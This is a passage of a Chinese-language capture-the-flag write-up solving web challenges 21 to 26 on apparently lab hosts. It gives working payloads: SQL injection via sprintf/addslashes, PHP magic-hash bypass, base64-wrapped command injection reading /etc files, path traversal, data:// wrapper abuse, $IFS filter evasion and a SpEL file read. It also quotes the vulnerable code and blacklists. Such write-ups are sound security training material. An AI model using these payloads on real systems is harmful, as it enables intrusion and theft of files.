viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">第二个是sprintf+addslashes的SQL注入，只要构造 <code>%1$&#x27; or 1#</code> 在addslashes的作用下在单引号前面会插入一个\，当传入sprintf时<code>%</code>就会‘吞掉’后面的\，从而‘’’逃逸出来，完成注入。</p>
<p class="my-4 leading-7">第三个需要跳过第18行的三个判断条件：</p>
<ol class="list-decimal pl-5 my-4 leading-7">
<li class="[&amp;:not(:first-child)]:mt-2">年龄等于999，这怎么可能。可以在sql后面通过union all的方式补充一条假的数据 <code>%1$&#x27;  union all select 1, 999 #</code></li>
<li class="[&amp;:not(:first-child)]:mt-2">password和password1的值不相等，但是md5运算却相等。刚开始想到了md5碰撞，但是后来想了想不应该这么复杂，就发现了PHP有个隐式转换的缺陷，PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 构造例子 QNKCDZO 240610708 当然，安全的比较方法是三个=，也就是“===”。</li>
</ol>
<p class="my-4 leading-7">完成以上所有的点之后，最终构造出来的url就有了。请求获取flag</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>https://sqli-ctfd.dun.mi.com/index.php?username=%1$&#x27; union all select 1, 999 %23&amp;age=999&amp;password=QNKCDZO&amp;password1=240610708</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<h3 id="web-21-一个网络测试工具" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-21-一个网络测试工具">#</a>web-21 一个网络测试工具</h3>
<p class="my-4 leading-7">这个题目传递一个ip参数，会对这个参数执行ping命令。想到了后端是不是使用了命令拼接直接交个shell执行。尝试分隔命令，引入自己的命令。</p>
<p class="my-4 leading-7">试了几个分隔符都不行，而且使用了黑名单的分隔符会出现禁止访问的页面。（试分隔符卡了好久。。。）</p>
<p class="my-4 leading-7">忽然想到ip的内容会回显到页面，可不可以通过二次运算的方式让执行命令的结果通过ping命令的报错回显出来。按照这个思路配合base64编码绕过字符检测，成功获取到了文件内容。</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>// cat index.php
</span></span><span style="display:block;padding:0 1.25rem">$($(base64 -d &lt;&lt;&lt; Y2F0IGluZGV4LnBocA==))
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">// cat /etc/getflag.php
</span><span style="display:block;padding:0 1.25rem">$($(base64 -d &lt;&lt;&lt; Y2F0IC9ldGMvZ2V0ZmxhZy5waHA=))</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">可以看一下被困扰了好久的庐山真面目：</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>GET /?ip=%24(%24(base64%20-d%20%3c%3c%3c%20Y2F0IGluZGV4LnBocA%3d%3d)) HTTP/2
</span></span><span style="display:block;padding:0 1.25rem">Host: vul-php1-ctf.dun.mi.com
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">HTTP/2 200 OK
</span><span style="display:block;padding:0 1.25rem">Date: Thu, 11 May 2023 12:16:22 GMT
</span><span style="display:block;padding:0 1.25rem">Content-Type: text/html; charset=UTF-8
</span><span style="display:block;padding:0 1.25rem">Server: MonKing/3.14
</span><span style="display:block;padding:0 1.25rem">Xiaomi-Security-Center: if any vulnerability found, go https://sec.xiaomi.com
</span><span style="display:block;padding:0 1.25rem">X-Proxy-Node: 6DFF018CAF79FBEC
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">ping: IDN encoding of &#x27;&#x27;&lt;?php&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">#flag在/etc/getflag.php&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">if (isset($_GET[&#x27;ip&#x27;])) {&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">    $ip = $_GET[&#x27;ip&#x27;];&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">    $in_ip = escape_shell_arg($ip);&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">    $ping_result = run_with_timeout(&quot;ping -c 2 \&quot;$in_ip\&quot;&quot;, 4);&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">    echo nl2br($ping_result);&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">} else {&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">    echo &quot;请传递 ip 参数！&quot;;&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">}&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">function escape_shell_arg($arg) {&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">    // 对字符串中的单引号、双引号、&amp;、|、;、`等字符进行过滤&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">    if (preg_match(&quot;/[&#x27;\&quot;&amp;|;`]/&quot;, $arg)) {&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">        http_response_code(403);&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">        exit;&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">    }&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">    return escapeshellarg($arg);&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">}&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">function run_with_timeout($cmd, $timeout) {&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">    $output = null;&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">    $pipes = null;&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">    // 创建一个子进程并执行命令&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">    $process = proc_open($cmd, [[&#x27;pipe&#x27;, &#x27;r&#x27;], [&#x27;pipe&#x27;, &#x27;w&#x27;], [&#x27;pipe&#x27;, &#x27;w&#x27;]], $pipes);&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">    &lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">    if (is_resource($process)) {&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">        stream_set_blocking($pipes[1], 0); // 非阻塞读取标准输出&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">        stream_set_blocking($pipes[2], 0); // 非阻塞读取标准错误&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">        $start_time = time();&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">        while (true) {&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">            // 检查子进程是否已经结束&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">            $status = proc_get_status($process);&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">            if (!$status[&#x27;running&#x27;]) {&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">                break;&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">            }&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">            // 读取标准输出和标准错误&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">            $stdout = stream_get_contents($pipes[1]);&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">            $stderr = stream_get_contents($pipes[2]);&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">            // 如果超时则杀死子进程并退出&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">            if (time() - $start_time &gt;= $timeout) {&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">                proc_terminate($process);&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">                return &quot;Command execution timed out!&quot;;&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">            }&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">            // 暂停一段时间再继续读取&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">            usleep(10000);&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">        }&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">        // 读取子进程退出时的标准输出和标准错误&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">        $output = stream_get_contents($pipes[1]);&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">        $output .= stream_get_contents($pipes[2]);&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">        fclose($pipes[0]);&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">        fclose($pipes[1]);&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">        fclose($pipes[2]);&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">        proc_close($process);&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">    }&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">    return $output;&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">}&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">&lt;br /&gt;
</span><span style="display:block;padding:0 1.25rem">?&gt;&#x27;&#x27; failed with error code 9&lt;br /&gt;</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<h3 id="web-22-文件预览服务器" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-22-文件预览服务器">#</a>web-22 文件预览服务器</h3>
<p class="my-4 leading-7">访问地址，提示提供filepath，随便试了几个，只是返回“文件不存在”。</p>
<p class="my-4 leading-7">试了下index.php，发现返回了源码。</p>
<p class="my-4 leading-7"><img alt="文件源码" src="/static/image/web-22-1.597d1db8.png"/></p>
<p class="my-4 leading-7">源码告诉了flag的位置和基本的代码逻辑。</p>
<p class="my-4 leading-7">看注释，说是不能包含两个连续的上一级，那就用当前目录隔开就行了。构造filepath获取flag。</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>filepath=.././.././../etc/flag.php</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<h3 id="web-23-php-is-best" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-23-php-is-best">#</a>web-23 PHP IS BEST</h3>
<p class="my-4 leading-7">php源码审计题</p>
<div class="language-php"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-php" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>&lt;?php
</span></span><span style="display:block;padding:0 1.25rem">include &#x27;flag.php&#x27;;
</span><span style="display:block;padding:0 1.25rem">extract($_GET);
</span><span style="display:block;padding:0 1.25rem">if (!empty($one))
</span><span style="display:block;padding:0 1.25rem">{
</span><span style="display:block;padding:0 1.25rem">    $three = trim(file_get_contents($two));
</span><span style="display:block;padding:0 1.25rem">    if ($one === $three)
</span><span style="display:block;padding:0 1.25rem">    {
</span><span style="display:block;padding:0 1.25rem">        echo &quot;&lt;p&gt;恭喜:&quot; .&quot; $flag&lt;/p&gt;&quot;;
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">    else
</span><span style="display:block;padding:0 1.25rem">    {
</span><span style="display:block;padding:0 1.25rem">        echo &quot;&lt;p&gt;继续加油！&lt;/p&gt;&quot;;
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">}
</span><span style="display:block;padding:0 1.25rem">else
</span><span style="display:block;padding:0 1.25rem">{
</span><span style="display:block;padding:0 1.25rem">    highlight_file(__FILE__);
</span><span style="display:block;padding:0 1.25rem">}
</span><span style="display:block;padding:0 1.25rem">?&gt;</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">从get参数的two传递一个路径，获取这个路径的值，并且与one中的值比较，如果相等则输出flag。</p>
<p class="my-4 leading-7">这个题目的关键是如何将two的值变为我们可控的一个值，正好file_get_contents支持获取base64编码的data值，由此构造一个请求。</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>http://10.167.15.103/?one=mictf&amp;two=data%3a%2f%2ftext%2fplain%3bbase64%2cbWljdGY%3d</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<h3 id="web-24-简约但不简单" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-24-简约但不简单">#</a>web-24 简约但不简单</h3>
<p class="my-4 leading-7">ping命令绕过，找到了一个原题。</p>
<p class="my-4 leading-7">首先获取index.php代码，绕过空格。 <code>?ip=1;cat$IFS$1index.php</code></p>
<div class="language-php"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-php" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>&lt;?php
</span></span><span style="display:block;padding:0 1.25rem">if(isset($_GET[&#x27;ip&#x27;])){
</span><span style="display:block;padding:0 1.25rem">  $ip = $_GET[&#x27;ip&#x27;];
</span><span style="display:block;padding:0 1.25rem">  if(preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match)){
</span><span style="display:block;padding:0 1.25rem">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match);
</span><span style="display:block;padding:0 1.25rem">    die(&quot;fxck your symbol!&quot;);
</span><span style="display:block;padding:0 1.25rem">  } else if(preg_match(&quot;/ /&quot;, $ip)){
</span><span style="display:block;padding:0 1.25rem">    die(&quot;fxck your space!&quot;);
</span><span style="display:block;padding:0 1.25rem">  } else if(preg_match(&quot;/bash/&quot;, $ip)){
</span><span style="display:block;padding:0 1.25rem">    die(&quot;fxck your bash!&quot;);
</span><span style="display:block;padding:0 1.25rem">  } else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){
</span><span style="display:block;padding:0 1.25rem">    die(&quot;fxck your flag!&quot;);
</span><span style="display:block;padding:0 1.25rem">  }
</span><span style="display:block;padding:0 1.25rem">  // $a = shell_exec(&quot;ping -c 4 &quot;.$ip);
</span><span style="display:block;padding:0 1.25rem">  $a = shell_exec(&quot;ping &quot;.$ip);
</span><span style="display:block;padding:0 1.25rem">  echo &quot;
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">&quot;;
</span><span style="display:block;padding:0 1.25rem">  print_r($a);
</span><span style="display:block;padding:0 1.25rem">}
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">?&gt;</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">看到代码确定是原题了。用拼接的方法，绕过对flag顺序的检测 <code>?ip=1%3ba%3dag.php%3bb%3dfl%3bcat%24IFS%241%24b%24a</code></p>
<h3 id="web-25-神奇的计算器" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-25-神奇的计算器">#</a>web-25 神奇的计算器</h3>
<p class="my-4 leading-7">随便输入一个表达式，会自动包裹<code>#{}</code>然后返回表达式结果，猜测是spEL的表达式引擎。spEL表达式可以通过T()获取类，然后利用内部的类执行一些命令。</p>
<p class="my-4 leading-7">思路是这样，实际操作过程中，发现过滤了很多关键词</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>getClass
</span></span><span style="display:block;padding:0 1.25rem">exec
</span><span style="display:block;padding:0 1.25rem">lang
</span><span style="display:block;padding:0 1.25rem">forName</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">这就导致getClass()然后forName()获取对应类的方法无法使用了。</p>
<p class="my-4 leading-7">试了好几个方法，终于发现一个读文件的方式没有被过滤，根据前几个Java题猜测（可能是一个人出的题目）flag的文件名是<code>flag.txt</code>。写入脚本成功获取flag。</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>expression=#{new java.util.Scanner(new java.io.File(&quot;flag.txt&quot;)).next()}</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<h3 id="web-26-天女散花" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-26-天女散花">#</a>web-26 天女散花</h3>
<p class="my-4 leading-7">上来给了一个页面，试了一下，发现跳转到error.html，开始猜测页面地址。最后猜到了success.html有内容。</p>
<p class="my-4 leading-7"><img alt="入口页面" src="/static/image/web-26-1.db114ba2.png"/></p>
<p class="my-4 leading-7">提供了四个页面，前三个每个页面的源码都能看到一段flag。</p>
<p class="my-4 leading-7"><img alt="页面1" src="/static/image/web-26-2.8538f33b.png"/></p>
<p class="my-4 leading-7"><img alt="页面2" src="/static/image/web-26-3.b94129a6.png"/></p>
<p class="my-4 leading-7"><img alt="页面3" src="/static/image/web-26-4.6bb0fddb.png"/></p>
<p class="my-4 leading-7">最后一个页面通过链接跳转不过去，看页面分布情况，猜测最后一个页面地址是04.html</p>
<p class="my-4 leading-7"><img alt="隐藏的页面4" src="/static/image/web-26-5.d8158292.png"/></p>
<p class="my-4 leading-7">拼凑出来提交flag。</p>
